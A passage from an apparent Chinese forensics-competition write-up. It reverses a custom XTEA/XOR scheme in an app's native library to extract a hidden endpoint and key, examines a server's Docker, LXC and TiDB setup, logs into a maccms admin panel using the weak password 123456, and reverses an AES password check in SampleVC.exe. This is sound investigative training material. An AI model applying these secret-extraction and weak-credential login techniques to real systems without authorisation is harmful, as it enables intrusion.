+# W10 的值由 0x13EC 处的 MOVZ + 0x13F8 处的 MOVK 组合得到。
+# 该值 = -DELTA (mod 2^32)，其中 DELTA = 0x9E3779B9 是标准 XTEA 常量。
+# 注意：此处为 0x61C8864F 而非标准的 0x61C88647（差值 8），
+# 这是该 App 的自定义修改，导致无法用标准 XTEA 库直接解密。
+DELTA_NEG
+=
+read_movz_movk
+(
+0x13EC
+,
+0x13F8
+)
+# 0x61C8864F
+# --- XTEA 两个独立累加和的初始值 ---
+# 该 XTEA 变体使用两个独立的累加和（W16 和 W0），
+# 而非标准 XTEA 的单一累加和。两者均从固定初始值开始，
+# 每轮递增 DELTA_NEG。
+#
+# W16 的初始值：由 0x1408 处 MOVZ + 0x1410 处 MOVK 组合
+# W0  的初始值：由 0x140C 处 MOVZ + 0x1418 处 MOVK 组合
+SUM1_INIT
+=
+read_movz_movk
+(
+0x1408
+,
+0x1410
+)
+# 0x8DDE6C40 — 第一个累加和
+SUM2_INIT
+=
+read_movz_movk
+(
+0x140C
+,
+0x1418
+)
+# 0xEFA6F28F — 第二个累加和
+# ================================================================
+# 第四步：XOR 混淆层
+# ================================================================
+def
+xor_layer
+(
+data
+):
+"""撤销 XOR 混淆层。
+对应 sub_1324 中的 NEON 向量 XOR 循环（loc_139C）：
+每个字节 data[i] 与 (i & 0x0F) ^ 0x55 进行异或。
+原始汇编逻辑（NEON 16 字节并行处理）：
+V0 = [0x0F × 16]          ; 低 4 位掩码
+V1 = [0x55 × 16]          ; 固定异或值
+V2 = [0x10 × 16]          ; 计数器步长
+V3 = [0,1,2,...,15]       ; 初始计数器
+循环：
+V4 = V3 AND V0          ; 取计数器低 4 位
+V3 = V3 + V2            ; 计数器递增 16
+*data = (*data XOR V4) XOR V1  ; 双重异或
+由于 XOR 是自逆运算（a ^ b ^ b = a），加密和解密使用相同操作。
+参数：
+data — 原始加密字节串
+返回：
+撤销 XOR 后的字节数组
+"""
+return
+bytearray
+(
+b
+^
+((
+i
+&
+0xF
+)
+^
+0x55
+)
+for
+i
+,
+b
+in
+enumerate
+(
+data
+))
+# ================================================================
+# 第五步：XTEA 分组密码解密
+# ================================================================
+def
+xtea_block
+(
+v14
+,
+v15
+):
+"""解密一个 8 字节分组 — 完全按照 sub_1324 的 TEA 循环汇编实现。
+这是一个标准 XTEA 的变体，主要区别：
+1. 使用两个独立的累加和（w16 和 w0），而非标准 XTEA 的单一 sum
+2. DELTA 值为 0x61C8864F（标准值 0x61C88647 + 8）
+3. 密钥调度通过 sum 的位域选择 key[idx]，其中：
+- v1 更新使用 key[(sum >> 11) & 3]  （UBFX W1, W16, #11, #2）
+- v0 更新使用 key[sum & 3]           （AND  W3, W0, #3）
+对应的汇编循环（loc_1420）：
+UBFX W1, W16, #0xB, #2    ; 从 W16 的 bit[12:11] 提取密钥索引
+LSL  W2, W14, #4           ; W2 = v0 << 4
+AND  W3, W0, #3            ; 从 W0 的 bit[1:0] 提取密钥索引
+EOR  W2, W2, W14, LSR#5   ; W2 = (v0 << 4) ^ (v0 >> 5)
+ADD  W2, W2, W14           ; W2 = f(v0) = ((v0<<4)^(v0>>5)) + v0
+LDR  W1, [X12, W1, UXTW#2]; W1 = key[idx1]
+ADD  W1, W16, W1           ; W1 = sum1 + key[idx1]
+ADD  W16, W16, W10         ; sum1 += DELTA_NEG（W10 = 0x61C8864F）
+EOR  W1, W2, W1            ; W1 = f(v0) ^ (sum1 + key)
+SUB  W15, W15, W1          ; v1 -= 混合值（解密用减法）
+...（v0 更新同理）...
+参数：
+v14 — 分组的第一个 32 位字（小端，对应 W14）
+v15 — 分组的第二个 32 位字（小端，对应 W15）
+返回：
+(v14, v15) — 解密后的两个 32 位字
+"""
+# 初始化两个累加和（对应汇编中的 MOV W16, #... / MOV W0, #...）
+w16
+=
+SUM1_INIT
+# 0x8DDE6C40 — 用于 v1 更新的累加和
+w0
+=
+SUM2_INIT
+# 0xEFA6F28F — 用于 v0 更新的累加和
+M
+=
+0xFFFFFFFF
+# 32 位掩码，模拟 ARM64 W 寄存器的自然溢出
+for
+_
+in
+range
+(
+64
+):
+# 64 轮迭代（对应 SUBS W17, W17, #1 / B.NE）
+# ── 更新 v1（W15）──
+# 对应汇编：UBFX W1, W16, #0xB, #2
+# 从 w16 的 bit[12:11] 提取 2 位作为密钥索引
+idx1
+=
+(
+w16
+>>
+11
+)
+&
+3
+# 计算 f(v0) = ((v0 << 4) ^ (v0 >> 5)) + v0
+# 对应汇编：LSL W2, W14, #4 / EOR W2, W2, W14, LSR#5 / ADD W2, W2, W14
+f_v0
+=
+((((
+v14
+<<
+4
+)
+&
+M
+)
+^
+(
+v14
+>>
+5
+))
++
+v14
+)
+&
+M
+# 计算混合值 = sum1 + key[idx1]
+# 对应汇编：LDR W1, [X12, W1, UXTW#2] / ADD W1, W16, W1
+mix1
+=
+(
+w16
++
+TEA_KEY
+[
+idx1
+])
+&
+M
+# 递增累加和（对应汇编：ADD W16, W16, W10）
+w16
+=
+(
+w16
++
+DELTA_NEG
+)
+&
+M
+# v1 减去混合值（对应汇编：SUB W15, W15, W1）
+v15
+=
+(
+v15
+-
+(
+f_v0
+^
+mix1
+))
+&
+M
+# ── 更新 v0（W14）──
+# 从 w0 的 bit[1:0] 提取 2 位作为密钥索引
+# 对应汇编：AND W3, W0, #3
+idx2
+=
+w0
+&
+3
+# 计算 f(v1) = ((v1 << 4) ^ (v1 >> 5)) + v1
+f_v1
+=
+((((
+v15
+<<
+4
+)
+&
+M
+)
+^
+(
+v15
+>>
+5
+))
++
+v15
+)
+&
+M
+# 计算混合值 = sum2 + key[idx2]
+mix2
+=
+(
+w0
++
+TEA_KEY
+[
+idx2
+])
+&
+M
+# 递增累加和
+w0
+=
+(
+w0
++
+DELTA_NEG
+)
+&
+M
+# v0 减去混合值
+v14
+=
+(
+v14
+-
+(
+f_v1
+^
+mix2
+))
+&
+M
+return
+v14
+,
+v15
+# ================================================================
+# 第六步：完整解密流程
+# ================================================================
+def
+decrypt
+(
+enc_addr
+,
+enc_size
+):
+"""完整解密流程：XOR → XTEA → 去填充 → 返回明文字符串。
+对应 sub_1324 函数的完整逻辑：
+1. malloc + memcpy：复制加密数据到工作缓冲区
+2. XOR 循环：撤销第一层混淆
+3. TEA 循环：撤销第二层加密（64 轮 × N 个 8 字节分组）
+4. 去填充：最后一个字节记录了填充长度
+5. malloc + memcpy + null-terminate：返回 C 字符串
+参数：
+enc_addr — 加密数据在 .so 文件中的偏移地址
+enc_size — 加密数据的字节长度（必须是 8 的倍数）
+返回：
+解密后的 ASCII 明文字符串
+"""
+# 第一步：XOR 混淆层（对应 sub_1324 的 NEON/scalar XOR 循环）
+data
+=
+xor_layer
+(
+binary
+[
+enc_addr
+:
+enc_addr
++
+enc_size
+])
+# 第二步：XTEA 分组解密（对应 sub_1324 的 TEA 循环 loc_1404）
+# 每 8 字节为一个 XTEA 分组，逐组解密
+for
+bi
+in
+range
+(
+enc_size
+>>
+3
+):
+# enc_size / 8 个分组
+off
+=
+bi
+*
+8
+# 当前分组的字节偏移
+# LDP W14, W15, [X13] — 从内存加载两个 32 位字（小端）
+v0
+=
+struct
+.
+unpack_from
+(
+'<I'
+,
+data
+,
+off
+)[
+0
+]
+# 第一个字（W14）
+v1
+=
+struct
+.
+unpack_from
+(
+'<I'
+,
+data
+,
+off
++
+4
+)[
+0
+]
+# 第二个字（W15）
+# 执行 64 轮 XTEA 解密
+v0
+,
+v1
+=
+xtea_block
+(
+v0
+,
+v1
+)
+# STP W14, W15, [X13] — 写回解密结果
+struct
+.
+pack_into
+(
+'<I'
+,
+data
+,
+off
+,
+v0
+)
+struct
+.
+pack_into
+(
+'<I'
+,
+data
+,
+off
++
+4
+,
+v1
+)
+# 第三步：去除 PKCS 填充
+# 填充方案：最后一个字节的值 = 填充字节数
+# 例如：明文 "abc" (3字节) 填充到 8 字节 → [a, b, c, 5, 5, 5, 5, 5]
+# 对应汇编：LDRB W8, [X19, W8, UXTW] / SUB W8, W20, W8
+pad
+=
+data
+[
+enc_size
+-
+1
+]
+# 读取最后一个字节（填充长度）
+if
+0
+<=
+pad
+<=
+enc_size
+:
+# 合理性检查
+length
+=
+enc_size
+-
+pad
+# 明文长度 = 总长度 - 填充长度
+else
+:
+length
+=
+enc_size
+# 异常情况：按全长返回
+# null-terminate 并解码为 ASCII 字符串
+return
+bytes
+(
+data
+[:
+length
+])
+.
+decode
+(
+'ascii'
+)
+# ================================================================
+# 第七步：执行解密并输出结果
+# ================================================================
+# 解密 getBackupEndpoint() 的返回值
+# 数据位置：unk_AB0，长度 0x20 = 32 字节
+# 对应汇编：ADRP X0, #unk_AB0@PAGE / ADD X0, X0, #unk_AB0@PAGEOFF / MOV W1, #0x20
+endpoint
+=
+decrypt
+(
+0xAB0
+,
+0x20
+)
+# 解密 getCommKey() 的返回值
+# 数据位置：unk_AD0，长度 0x18 = 24 字节
+# 对应汇编：在 sub_F08 中 ADRP X0, #unk_AD0 / MOV W1, #0x18
+commkey
+=
+decrypt
+(
+0xAD0
+,
+0x18
+)
+# 输出结果
+print
+(
+'='
+*
+60
+)
+print
+(
+f
+'getBackupEndpoint() =>
+{
+endpoint
+}
+'
+)
+print
+(
+f
+'getCommKey()        =>
+{
+commkey
+}
+'
+)
+print
+(
+'='
+*
+60
+)
+print
+()
+print
+(
+f
+'备用端点（Native加密）: https://
+{
+endpoint
+}
+/api/v2'
+)
+服务器部分
+¶
+Info
+以下题目分析服务器检材。
+检材中的 2 个 EWF 镜像是动态的 LVM 卷, 火眼现在可以自动识别到 LVM 容器并提示用户添加关联镜像:
+但是火眼并没有解析 LVM 容器中的 Raid 分卷, 因此无法读取到文件系统. UFS 可以重组解析 Raid 并解析其中的 Btrfs 文件系统:
+另外, 使用火眼仿真可以正常仿真虚拟机. 以下的大部分题目在仿真虚拟机中完成. 仿真之后居然是个带 XFCE 图形化界面的 Ubuntu, 查看 ip 地址:
+但是在系统启动时看到的操作系统应该是 Debian 13 才对, 查看 Grub 信息可以比较清晰地看到:
+这很奇怪, 而且进入系统之后看到的系统信息和根目录的文件内容也与在 UFS 中看到的不同. 重启虚拟机, 通过 Grub 进入 Recovery, 又看到了完全不同的情况:
+Recovery 模式启动的系统又是 Debian 了. 我甚至一度怀疑是不是出题人修改了 Grub 的配置, 在启动时默认使用的系统引导其实启动了另外一个 Ubuntu 系统, 但仔细对比了一下 Debian 和 Debian Recovery 的 Grub 脚本, 发现使用的镜像完全相同. 直到我试着在 Recovery 模式中搜索
+os-release
+文件, 事情才变得明朗起来:
+/data
+目录中的
+overlay2
+不出意外的话是 Docker 的 OverlayFS 的存储目录, 在其中有一个
+os-release
+文件, 内容与之前在仿真系统的图形化界面中看到的完全一致. 估计是系统启动之后的某个脚本/服务, 直接进入了 Docker 容器内部.
+于是开始寻找问题出在哪里, 排查了以下位置:
+/etc/systemd/
+/etc/rc*.d/
+/home/mac/
+最终发现问题出在
+/home/mac/.xinitrc
+文件
+该脚本在 Docker 容器内运行了桌面环境和 SSH 服务, 并将端口映射到了外部机器.
+并且
+/etc/systemd/system/getty@tty1.service.d/override.conf
+中, 会让系统在启动后自动登录
+mac
+用户:
+整个系统启动 & 用户登录流程如下:
+系统启动, systemd 进入
+graphical.target
+getty 自动登录,
+/etc/systemd/system/getty@tty1.service.d/override.conf
+自动以用户 mac 登录
+.bash_profile
+检测到无 DISPLAY, 执行 startx (
+.xinitrc
+)
+.xinitrc
+启动 Docker 容器
+u24
+, 然后在容器内启动 XFCE 桌面和 SSH 服务
+在 bash 的历史记录
+/root/.bash_history
+中可以看到出题人操作的过程:
+因此, 只需要在 Recovery 模式中删除
+.xinitrc
+即可正常进入仿真虚拟机本身的 Shell:
+接着还需要安装 OpenSSH Server, 之后即可正常通过 SSH 连接仿真虚拟机了.
+并且, 这时所有的服务也都正常运行了, 服务器部署的网站也可以访问(
+http://ip:80
+):
+28 该服务器主机操作系统版本
+¶
+答案
+13.0
+查看 Debian 系统的
+os-release
+文件:
+Bash
+cat
+/etc/os-release
+29 该服务器根分区硬盘的 UUID 号
+¶
+答案
+3231e52f-5e15-44c4-b224-e29cb4201c0e
+用 UFS 加载镜像, 查看
+@rootfs/etc/fstab
+:
+在启动仿真虚拟机时编辑 Grub 也可以看到:
+或者通过 lsblk 查看:
+Bash
+lsblk
+-o
+name,type,fstype,uuid
+30 该服务器中最新的 Docker 镜像创建时间
+¶
+答案
+2026-04-16T07:15:50.535713491Z
+通过
+docker iamges
+查看所有镜像, 最近创建的镜像是
+u22:latest
+, 镜像 id 为
+1c89854511ca
+:
+通过
+docker inspect 1c89
+查看镜像的详细信息, 创建于
+2026-04-16T07:15:50.535713491Z
+:
+31 该服务器根分区快照路径
+¶
+答案
+/root/history
+通过
+btrfs subvolume list /
+查看根目录下的子卷, 其中的
+root/history
+即为快照:
+32 该网站后台管理入口对应的文件名
+¶
+答案
+user.php
+网站源码位于
+/var/www/maccms10
+目录下. 在赛前分享时就准备好了 maccms10 的源码
+magicblack/maccms10
+. 直接将站点目录复制到本地, 用 WinMerge 和源码对比一下 diff:
+发现相较源码, 站点根目录下少了
+admin.php
+, 多了
+user.php
+, 对比这两个文件的内容, 发现完全一致:
+该文件即为管理后台的入口文件. 访问
+http://ip:80/user.php
+即为网站后台:
+在
+application/database.php
+中可以看到站点连接的数据库信息为
+aa:123456@mytidb:3306/mac2
+:
+使用 Navicat 通过 SSH 隧道连接:
+在表
+mac_admin
+中看到管理员账户的用户名和密码信息:
+在源码中搜索"admin_pwd":
+这个 md5 看起来很熟悉, 其实就是
+123456
+的 md5, 使用
+root/123456
+登录后台:
+33 该网站设置的 ICP 备案号
+¶
+答案
+icp1919810
+在网站源码中搜索"icp"关键字, 先看到了网页模板中对 icp 的渲染方式, 是获取了
+site_icp
+变量的值:
+因此, 在网站源码中搜索"site_icp", 找到了
+application/extra/maccms.php
+中存在相应的配置:
+或者登录后台之后查看网站参数配置:
+34 该网站设置的主域名
+¶
+答案
+www.2026fic.forensix
+接上题. 同样在
+application/extra/maccms.php
+的站点配置中看到
+site_url
+.
+或者查看网站参数配置.
+35 该网站分类 3 中, 视频的拼音
+¶
+答案
+sipaanshe
+在后台中的分类管理中看到有分类3:
+在视频数据中筛选"分类3"的视频:
+点击"编辑"查看该视频的详细信息:
+36 该站点设置页面中, 被使用的前端模板来自于哪个源文件
+¶
+答案
+application/admin/view_new/index/index.html
+查看后台的 html 源码, 寻找一处比较有特征的 html
+<div class="layui-layout layui-layout-admin w-full">
+:
+在源码中搜索:
+37 该网站的伪静态规则配置文件 SM3 值
+¶
+答案
+e73407468e6f52af54c7b14632eeeb9be25b05106d06c4c3085fc843c223793f
+Nginx 配置文件
+/etc/nginx/sites-available/default
+中包含 rewrite 伪静态规则:
+Bash
+cat
+/etc/nginx/sites-available/default
+|
+grep
+rewrite
+计算该配置文件的 SM3 哈希:
+Bash
+openssl
+dgst
+-sm3
+/etc/nginx/sites-available/default
+38 该网站关联的数据库 IP 地址
+¶
+答案
+10.0.3.100
+先前连接数据库时, 通过 SSH 隧道连接到虚拟机, 并使用主机名
+mytidb
+连接. 也就是需要查看
+mytidb
+的实际 IP 地址.
+可以查看
+/etc/hosts
+:
+Bash
+cat
+/etc/hosts
+或者也可以直接 PING 一下, 查看回应的主机 IP 地址:
+39 该网站数据库使用了哪一类容器技术
+¶
+答案
+LXC
+在 Bash 的历史记录
+/root/.bash_history
+中可以看到关于"tidb"的记录:
+其中用到了带有共同前缀
+lxc-
+的二进制文件. 尝试运行一下
+lxc-info mytidb
+:
+发现似乎是查看了
+mytidb
+的信息, 有运行状态, IP, 链路的信息.
+Linux Containers (LXC)
+LXC 是一种操作系统级虚拟化技术, 允许在单个 Linux 主机上运行多个隔离的 Linux 系统容器. 每个容器拥有独立的文件系统、进程空间、网络接口和用户环境, 但共享主机的 Linux 内核.
+Docker 最初使用 LXC 作为其底层容器运行时. 在 Docker 0.9 版本中, Docker 用自研的
+libcontainer
+替代了 LXC.
+40 运行在 4000 端口的备份数据库版本号
+¶
+答案
+TiDB v7.5.0
+通过
+lxc-attach -n mytidb
+进入
+mytidb
+容器内 Shell. 再查看系统日志:
+Bash
+cat
+/var/log/syslog
+|
+grep
+:4000
+|
+head
+-n
+10
+确认运行在 4000 端口的服务为 TiDB.
+再查看 TiDB 的相关日志:
+Bash
+cat
+/var/log/syslog
+|
+grep
+tidb
+|
+head
+-n
+10
+或者通过
+tiup status
+查看 tidb 的状态:
+41 新注册用户数量最多的日期
+¶
+答案
+2026-04-15
+在数据库的表
+mac_user
+中可以看到所有用户的信息, 其中字段
+user_reg_time
+是以时间戳存储的用户注册时间:
+在 Navicat 中导出
+mac_user
+表的数据到 JSON 文件. 写一个简单的 python 脚本处理数据:
+Python
+import
+json
+json_file
+=
+open
+(
+"./mac_user.json"
+,
+"r"
+,
+encoding
+=
+"utf-8"
+)
+json
+=
+json
+.
+load
+(
+json_file
+)
+count
+=
+dict
+()
+for
+i
+in
+json
+:
+date
+=
+datetime
+.
+fromtimestamp
+(
+i
+.
+get
+(
+"user_reg_time"
+))
+.
+strftime
+(
+"%Y-%m-
+%d
+"
+)
+if
+date
+in
+count
+.
+keys
+():
+count
+[
+date
+]
++=
+1
+else
+:
+count
+[
+date
+]
+=
+1
+print
+(
+max
+(
+count
+,
+key
+=
+count
+.
+get
+))
+# 2026-04-15
+42 马慧美最后一次登录该网站的 IP
+¶
+答案
+240.12.18.80
+猜一下马慧美的用户名, 可能是
+Ma Hui Mei
+,
+Ma Huimei
+或者
+Huimei Ma
+, 都搜一下, 找到了用户, 查看其最后登录的 IP 地址:
+43 以下哪个文件系统未被使用
+¶
+A. ntfs
+B. btrfs
+C. xfs
+D. lvm
+答案
+AC
+可以看到系统中用到了 btrfs 和 lvm:
+此外, tidb 的容器存储在 zfs 的虚拟卷中.
+44 该服务器安装了以下哪些数据库服务
+¶
+A. mysql
+B. GuessDB
+C. tidb
+D. postgresql
+E. mariadb
+答案
+CDE
+服务器并没有安装 MySQL. 网站使用的实际上是 TiDB 兼容 MySQL 的 Connector.
+如果尝试在命令行查看
+mysql
+的版本, 会看到实际上是来自于 MariaDB 的二进制文件:
+查看
+pgbench
+的版本, 确认安装有 PostgreSQL:
+互联网部分
+¶
+Info
+以下题目分析互联网侧检材与公开信息。
+45 售卖卡密的公开群组 ID
+¶
+答案
+FIC_2026
+在服务器站点配置中查看支付/卡密相关配置:
+46 备份数据库中视频图片的文件名
+¶
+答案
+7b3fdd9d464ce48e7f20cd45f918c9a6.jpg
+使用 Navicat 通过 SSH 隧道连接 mytidb 容器中的 tidb 服务, 使用连接参数
+aa:123456@mytidb:4000
+:
+查看表
+mac_vod
+, 其中有一条记录. 该记录的字段
+vod_pic
+为
+upload/vod/20260415-1/7b3fdd9d464ce48e7f20cd45f918c9a6.jpg
+:
+47 ngrok 提供的域名
+¶
+答案
+blemish-junior-unengaged.ngrok-free.dev
+在 Nginx 的日志目录中, 先解压所有 gz 压缩过的日志:
+Bash
+gunzip
+access.log.*.gz
+再读取所有日志, 查找其中包含"ngrok"的条目:
+ngrok
+ngrok 是一个内网穿透/反向代理工具, 可以将本地服务暴露到公网上, 将
+localhost
+映射为公网可访问的 URL, 支持 HTTP/HTTPS/TCP 流量.
+二进制程序部分
+¶
+Info
+以下题目分析 U 盘检材及其中的二进制程序。
+48 U 盘检材中保存的加密程序
+SampleVC.exe
+的 MD5 值
+¶
+答案
+764789dd9c095d74b6b258cf0f7568b2
+计算哈希:
+49 分析
+SampleVC.exe
+, 该程序编译的日期可能是什么?
+¶
+答案
+2026-04-17 13:53:20
+导出
+SampleVC.exe
+, 使用 DIE 加载, 查看映像头信息:
+50 分析
+SampleVC.exe
+, 正确的密码是什么?
+¶
+答案
+PleaseRunAsAdmin
+使用 IDA 加载
+SampleVC.exe
+, 可以找到
+WinMain
+函数, 说明这是一个 VC++ 的 GUI 程序.
+函数前大部分用于初始化和变量加载:
+C
+LoadStringW
+(
+hInstance
+,
+0x67u
+,
+&
+WindowName
+,
+100
+);
+LoadStringW
+(
+hInstance
+,
+0x6Du
+,
+&
+ClassName
+,
+100
+);
+v11
+.
+cbSize
+=
+80
+;
+v11
+.
+lpfnWndProc
+=
+(
+WNDPROC
+)
+sub_1400024A0
+;
+v11
+.
+style
+=
+3
+;
+*
+(
+_QWORD
+*
+)
+&
+v11
+.
+cbClsExtra
+=
+0
+;
+v11
+.
+hInstance
+=
+hInstance
+;
+v11
+.
+hIcon
+=
+LoadIconW
+(
+hInstance
+,
+(
+LPCWSTR
+)
+0x6B
+);
+CursorW
+=
+LoadCursorW
+(
+0
+,
+(
+LPCWSTR
+)
+0x7F00
+);
+*
+(
+__m128i
+*
+)
+&
+v11
+.
+hbrBackground
+=
+_mm_load_si128
+((
+const
+__m128i
+*
+)
+&
+xmmword_1400058A0
+);
+v11
+.
+hCursor
+=
+CursorW
+;
+v11
+.
+lpszClassName
+=
+&
+ClassName
+;
+v11
+.
+hIconSm
+=
+LoadIconW
+(
+hInstance
+,
+(
+LPCWSTR
+)
+0x6C
+);
+RegisterClassExW
+(
+&
+v11
+);
+SystemParametersInfoW
+(
+0x30u
+,
+0
+,
+pvParam
+,
+0
+);
+::
+hInstance
+=
+hInstance
+;
+Window
+=
+CreateWindowExW
+(
+0
+,
+&
+ClassName
+,
+&
+WindowName
+,
+0
+,
+(
+pvParam
+[
+2
+]
+-
+pvParam
+[
+0
+]
+-
+500
+)
+/
+2
+,
+(
+pvParam
+[
+3
+]
+-
+pvParam
+[
+1
+]
+-
+300
+)
+/
+2
+,
+500
+,
+300
+,
+0
+,
+0
+,
+hInstance
+,
+0
+);
+v8
+=
+Window
+;
+if
+(
+Window
+)
+{
+ShowWindow
+(
+Window
+,
+nShowCmd
+);
+UpdateWindow
+(
+v8
+);
+picce
+.
+dwSize
+=
+8
+;
+picce
+.
+dwICC
+=
+255
+;
+InitCommonControlsEx
+(
+&
+picce
+);
+AcceleratorsW
+=
+LoadAcceleratorsW
+(
+hInstance
+,
+(
+LPCWSTR
+)
+0x6D
+);
+while
+(
+GetMessageW
+(
+&
+Msg
+,
+0
+,
+0
+,
+0
+)
+)
+{
+if
+(
+!
+TranslateAcceleratorW
+(
+Msg
+.
+hwnd
+,
+AcceleratorsW
+,
+&
+Msg
+)
+)
+{
+TranslateMessage
+(
+&
+Msg
+);
+DispatchMessageW
+(
+&
+Msg
+);
+}
+}
+LODWORD
+(
+Window
+)
+=
+Msg
+.
+wParam
+;
+}
+return
+(
+int
+)
+Window
+;
+}
+其中的
+v11.lpfnWndProc = (WNDPROC)sub_1400024A0
+, 代表主窗口进程为
+sub_1400024A0
+函数. 跟进.
+C
+switch
+(
+a2
+)
+{
+case
+1u
+:
+hWnd
+=
+CreateWindowExW
+(
+0x200u
+,
+L
+"EDIT"
+,
+&
+word_14000570C
+,
+0x50800080u
+,
+150
+,
+70
+,
+200
+,
+30
+,
+hWndParent
+,
+(
+HMENU
+)
+0x4E21
+,
+hInstance
+,
+0
+);
+qword_140008798
+=
+CreateWindowExW
+(
+0x200u
+,
+L
+"EDIT"
+,
+&
+word_14000570C
+,
+0x50800080u
+,
+150
+,
+100
+,
+200
+,
+30
+,
+hWndParent
+,
+(
+HMENU
+)
+0x4E22
+,
+hInstance
+,
+0
+);
+CreateWindowExW
+(
+0
+,
+L
+"BUTTON"
+,
+&
+word_14000571C
+,
+0x50000000u
+,
+140
+,
+150
+,
+100
+,
+30
+,
+hWndParent
+,
+(
+HMENU
+)
+0x2711
+,
+hInstance
+,
+0
+);
+break
+;
+case
+2u
+:
+PostQuitMessage
+(
+0
+);
+break
+;
+case
+0xFu
+:
+SendMessageW
+(
+hWnd
+,
+0x1501u
+,
+1u
+,
+(
+LPARAM
+)
+&
+lParam
+);
+SendMessageW
+(
+qword_140008798
+,
+0x1501u
+,
+1u
+,
+(
+LPARAM
+)
+&
+qword_140005750
+);
+BeginPaint
+(
+hWndParent
+,
+&
+Paint
+);
+EndPaint
+(
+hWndParent
+,
+&
+Paint
+);
+break
+;
+case
+0x111u
+:
+switch
+(
+(
+unsigned
+__int16
+)
+a3
+)
+{
+case
+0x68u
+:
+DialogBoxParamW
+(
+hInstance
+,
+(
+LPCWSTR
+)
+0x67
+,
+hWndParent
+,
+DialogFunc
+,
+0
+);
+break
+;
+case
+0x69u
+:
+DestroyWindow
+(
+hWndParent
+);
+break
+;
+case
+0x2711u
+:
+sub_140002200
+();
+break
+;
+default
+:
+a2
+=
+273
+;
+return
+DefWindowProcW
+(
+hWndParent
+,
+a2
+,
+a3
+,
+a4
+);
+}
+break
+;
+default
+:
+return
+DefWindowProcW
+(
+hWndParent
+,
+a2
+,
+a3
+,
+a4
+);
+}
+return
+0
+;
+}
+函数
+sub_1400024A0
+创建了 2 个输入框("EDIT"), 组件 ID 分别为
+0x4E21
+和
+0x4E22
+; 创建了 1 个按钮("BUTTON"), 组件 ID 为
+0x2711
+. 当点击 BUTTON 之后(
+case 0x111
+中的
+case 0x2711u
+分支), 进入函数
+sub_140002200
+. 跟进.
+C
+// 从 GUI 获取 hWnd 和 qword_140008798 的值
+SendMessageW
+(
+hWnd
+,
+0xDu
+,
+0x200u
+,
+(
+LPARAM
+)
+lParam
+);
+// hWnd -> lParam
+SendMessageW
+(
+qword_140008798
+,
+0xDu
+,
+0x40u
+,
+(
+LPARAM
+)
+v15
+);
+// qword_140008798 -> v15
+// 限制 lParam 长度为 0xFF = 256 字节
+v0
+=
+-1
+;
+do
+++
+v0
+;
+while
+(
+lParam
+[
+v0
+]
+);
+if
+(
+!
+v0
+||
+v0
+>
+0xFF
+)
+{
+v2
+=
+&
+word_1400056A8
+;
+goto
+LABEL_19
+;
+}
+// 限制 qword_140008798 长度为 16 字节
+v1
+=
+-1
+;
+do
+++
+v1
+;
+while
+(
+*
+((
+_WORD
+*
+)
+v15
++
+v1
+)
+);
+if
+(
+v1
+!=
+16
+)
+{
+v2
+=
+(
+const
+WCHAR
+*
+)
+&
+unk_1400056B8
+;
+LABEL_19
+:
+MessageBoxW
+(
+0
+,
+v2
+,
+&
+word_14000569C
+,
+0
+);
+return
+0
+;
+}
+// 限制 qword_140008798 中的每个字节介于 0x20 与 0x5E 之间, 即可见 ASCII 字符
+v3
+=
+0
+;
+v4
+=
+v15
+;
+do
+{
+if
+(
+(
+unsigned
+__int16
+)(
+*
+(
+_WORD
+*
+)
+v4
+-
+32
+)
+>
+0x5Eu
+)
+{
+v2
+=
+(
+const
+WCHAR
+*
+)
+&
+unk_1400056C8
+;
+goto
+LABEL_19
+;
+}
+++
+v3
+;
+v4
+=
+(
+LPARAM
+*
+)((
+char
+*
+)
+v4
++
+2
+);
+}
+while
+(
+(
+unsigned
+__int64
+)
+v3
+<
+0x10
+);
+// 密码转换 将用户输入的 16 字节的密码通过 CP_UTF8 转换为多字节字符串, 存入 lpMultiByteStr
+lpMultiByteStr
+=
+(
+CHAR
+*
+)
+operator
+new
+(
+0x10u
+);
+WideCharToMultiByte
+(
+0xFDE9u
+,
+0
+,
+(
+LPCWCH
+)
+v15
+,
+-1
+,
+lpMultiByteStr
+,
+16
+,
+0
+,
+0
+);
+// 初始化 AES 密钥 0x0123456789ABCDEF0123456789ABCDEF
+v8
+[
+0
+]
+=
+0x67452301
+;
+v8
+[
+1
+]
+=
+0xEFCDAB89
+;
+v8
+[
+2
+]
+=
+0x67452301
+;
+v8
+[
+3
+]
+=
+0xEFCDAB89
+;
+// AES 加密
+v6
+=
+(
+char
+*
+)
+operator
+new
+(
+0x11u
+);
+*
+(
+_OWORD
+*
+)
+v6
+=
+*
+(
+_OWORD
+*
+)
+lpMultiByteStr
+;
+sub_140001230
+(
+Str2
+,
+v6
+,
+(
+__int128
+*
+)
+v8
+);
+// 目标密文 0xAFB977AC242AD60CF42461AD72CA5149
+*
+(
+_DWORD
+*
+)
+Str1
+=
+0xAC77B9AF
+;
+v11
+=
+0xCD62A24
+;
+v12
+=
+0xAD6124F4
+;
+v13
+=
+0x4951CA72
+;
+v14
+=
+0
+;
+if
+(
+!
+strncmp
+(
+Str1
+,
+Str2
+,
+0x10u
+)
+)
+{
+if
+(
+(
+unsigned
+int
+)
+sub_140001CF0
+(
+lParam
+,
+(
+__int64
+)
+lpMultiByteStr
+)
+==
+1
+)
+MessageBoxW
+(
+0
+,
+&
+Text
+,
+&
+Caption
+,
+0
+);
+else
+MessageBoxW
+(
+0
+,
+&
+word_1400056F0
+,
+&
+Caption
+,
+0
+);
+}
+else
+{
+MessageBoxW
+(
+0
+,
+&
+word_140005700
+,
+&
+word_14000569C
+,
+0
+);
+}
+return
+0
+;
+继续跟进
+sub_140001230
+的解密过程.
+sub_140001230
+整体上是一个标准的 AES 加密, 但在 AES 加密前对明文进行了额外的处理:
+C
+if
+(
+dword_140008090
+<
+6
+)
+{
+do
+{
+a2
+[
+v12
+]
+^=
+2
+*
+v12
++
+v12
++
+127
+;
+// a2[i] ^= 3 * i + 0x7F
+++
+v12
+;
+}
+while
+(
+v12
+<
+0x10
+);
+据以上分析过程, 可以编写出解密脚本:
+Python
+from
+Crypto.Cipher
+import
+AES
+ciphertext
+=
+bytes
+([
+0xAF
+,
+0xB9
+,
+0x77
+,
+0xAC
+,
+0x24
+,
+0x2A
+,
+0xD6
+,
+0x0C
+,
+0xF4
+,
+0x24
+,
+0x61
+,
+0xAD
+,
+0x72
+,
+0xCA
+,
+0x51
+,
+0x49
+])
+key
+=
+bytes
+([
+0x01
+,
+0x23
+,
+0x45
+,
+0x67
+,
+0x89
+,
+0xAB
+,
+0xCD
+,
+0xEF
+,
+0x01
+,
+0x23
+,
+0x45
+,
+0x67
+,
+0x89
+,
+0xAB
+,
+0xCD
+,
+0xEF
+])
+cipher
+=
